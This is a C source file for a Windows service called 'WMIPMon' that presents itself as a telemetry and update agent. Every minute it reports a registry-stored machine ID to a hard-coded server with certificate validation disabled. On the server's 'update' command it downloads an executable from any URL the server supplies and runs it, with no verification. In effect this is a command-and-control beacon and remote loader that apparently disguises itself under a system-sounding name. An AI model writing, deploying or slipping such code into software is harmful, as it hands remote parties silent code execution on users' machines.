#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string.h>
#include <rpc.h>
#include "cJSON.h"

#define SERVICE_NAME "WMIPMon"
#define TARGET_HOST "10.113.210.251"
#define TARGET_HTTP_PORT 8888
#define INTERVAL_MS (1 * 60 * 1000)

SERVICE_STATUS g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_ServiceStopEvent = NULL;

void WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
void WINAPI ServiceCtrlHandler(DWORD CtrlCode);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);
void MakeHttpsPostRequestAndParseJSON(void);
void LogJsonResponseToFile(const char* jsonResponse);
void LogAppStatus(const char* AppStatus);
BOOL CheckOrCreateUUID(char* outUuid, DWORD outUuidSize);

char g_Uuid[64] = { 0 };

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Rpcrt4.lib")

void LogJsonResponseToFile(const char* jsonResponse) {
    FILE* logFile = fopen("C:\\Users\\Seth\\Desktop\\response_log.txt", "a");
    if (!logFile) return;
    fprintf(logFile, "%s\n", jsonResponse);
    fclose(logFile);
}

void LogAppStatus(const char* AppStatus) {
    FILE* logFile = fopen("C:\\Users\\Seth\\Desktop\\app_log.txt", "a");
    if (!logFile) return;
    fprintf(logFile, "%s\n", AppStatus);
    fclose(logFile);
}

int DownloadFile(const char* url, const char* outputFile) {
    char logMsg[512];
    LogAppStatus("DownloadFile: Entered function");

    HINTERNET hInternet = InternetOpen("MyDownloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        snprintf(logMsg, sizeof(logMsg), "InternetOpen failed: %lu", GetLastError());
        LogAppStatus(logMsg);
        return 1;
    }

    HINTERNET hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        snprintf(logMsg, sizeof(logMsg), "InternetOpenUrl failed for URL %s: %lu", url, GetLastError());
        LogAppStatus(logMsg);
        InternetCloseHandle(hInternet);
        return 1;
    }

    snprintf(logMsg, sizeof(logMsg), "Opening file for writing: %s", outputFile);
    LogAppStatus(logMsg);

    FILE* file = fopen(outputFile, "wb");
    if (!file) {
        snprintf(logMsg, sizeof(logMsg), "Failed to open file for writing: %s", outputFile);
        LogAppStatus(logMsg);
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return 1;
    }

    LogAppStatus("Begin reading from InternetReadFile");

    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        fwrite(buffer, 1, bytesRead, file);
    }

    fclose(file);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    snprintf(logMsg, sizeof(logMsg), "Download complete. File saved to: %s", outputFile);
    LogAppStatus(logMsg);

    // Launch downloaded file
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(outputFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        snprintf(logMsg, sizeof(logMsg), "CreateProcess failed: %lu", GetLastError());
        LogAppStatus(logMsg);
        return 1;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}


BOOL CheckOrCreateUUID(char* outUuid, DWORD outUuidSize) {
    if (!outUuid || outUuidSize < 1) return FALSE;

    HKEY hKey;
    LPCSTR subKey = "SOFTWARE\\WOW6432Node\\wmipmon";
    LPCSTR valueName = "uuid";
    DWORD disposition;
    CHAR uuidStr[64] = { 0 };
    DWORD dataSize = sizeof(uuidStr);

    LONG result = RegCreateKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, NULL, 0, KEY_READ | KEY_WRITE, NULL, &hKey, &disposition);
    if (result != ERROR_SUCCESS) return FALSE;

    result = RegQueryValueExA(hKey, valueName, NULL, NULL, (LPBYTE)uuidStr, &dataSize);
    if (result == ERROR_SUCCESS && uuidStr[0] != '\0') {
        strncpy(outUuid, uuidStr, outUuidSize - 1);
        outUuid[outUuidSize - 1] = '\0';
    }
    else {
        UUID uuid;
        if (UuidCreate(&uuid) != RPC_S_OK) {
            RegCloseKey(hKey);
            return FALSE;
        }
        RPC_CSTR strUuid = NULL;
        if (UuidToStringA(&uuid, &strUuid) == RPC_S_OK) {
            RegSetValueExA(hKey, valueName, 0, REG_SZ, strUuid, (DWORD)strlen((char*)strUuid) + 1);
            strncpy(outUuid, (char*)strUuid, outUuidSize - 1);
            outUuid[outUuidSize - 1] = '\0';
            RpcStringFreeA(&strUuid);
        }
        else {
            RegCloseKey(hKey);
            return FALSE;
        }
    }

    RegCloseKey(hKey);
    return TRUE;
}

void MakeHttpsPostRequestAndParseJSON(void) {
    char responseBuffer[4096];
    DWORD bytesRead;

    // Step 1: Create JSON body
    cJSON* json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "uuid", g_Uuid);
    cJSON_AddStringToObject(json, "memory", "2GB");
    cJSON_AddStringToObject(json, "cpu", "Intel i5");
    cJSON_AddStringToObject(json, "disk", "256GB SSD");

    char* postData = cJSON_PrintUnformatted(json);
    DWORD postDataLen = (DWORD)strlen(postData);
    const char* headers = "Content-Type: application/json\r\n";

    // Step 2: Open internet connection
    HINTERNET hInternet = InternetOpen("WebPostService", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        cJSON_Delete(json);
        free(postData);
        return;
    }

    // Step 3: Connect to HTTPS host
    HINTERNET hConnect = InternetConnect(hInternet, TARGET_HOST, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        cJSON_Delete(json);
        free(postData);
        return;
    }

    // Step 4: Create HTTPS POST request
    HINTERNET hRequest = HttpOpenRequest(
        hConnect,
        "POST",
        "/telemetry/",
        NULL,
        NULL,
        NULL,
        INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD,
        0
    );
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        cJSON_Delete(json);
        free(postData);
        return;
    }

    // Step 5: Ignore SSL certificate issues
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    // Step 6: Send HTTPS POST request
    BOOL result = HttpSendRequest(hRequest, headers, -1L, (LPVOID)postData, postDataLen);
    if (!result) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        cJSON_Delete(json);
        free(postData);
        return;
    }

    // Step 7: Read and parse the response
    if (InternetReadFile(hRequest, responseBuffer, sizeof(responseBuffer) - 1, &bytesRead) && bytesRead > 0) {
        responseBuffer[bytesRead] = '\0';
        LogJsonResponseToFile(responseBuffer);

        cJSON* responseJson = cJSON_Parse(responseBuffer);
        if (responseJson) {
            cJSON* command = cJSON_GetObjectItemCaseSensitive(responseJson, "command");
            cJSON* parameters = cJSON_GetObjectItemCaseSensitive(responseJson, "parameters");

            if (cJSON_IsString(command) && cJSON_IsString(parameters)) {
                if (strcmp(command->valuestring, "update") == 0) {
                    char tempPath[MAX_PATH];
                    GetTempPathA(MAX_PATH, tempPath);
                    strcat(tempPath, "downloaded_file.exe");
                    DownloadFile(parameters->valuestring, tempPath);
                }
            }

            cJSON_Delete(responseJson);
        }
    }

    // Cleanup
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    cJSON_Delete(json);
    free(postData);
}


DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
        MakeHttpsPostRequestAndParseJSON();
        Sleep(INTERVAL_MS);
    }
    return 0;
}

void WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    if (CtrlCode == SERVICE_CONTROL_STOP) {
        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING) return;
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_ServiceStatus.dwWin32ExitCode = 0;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        SetEvent(g_ServiceStopEvent);
    }
}

void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
    if (!g_StatusHandle) return;

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!g_ServiceStopEvent) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }

    if (!CheckOrCreateUUID(g_Uuid, sizeof(g_Uuid))) return;

    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(g_ServiceStopEvent);
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

int main(void) {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}
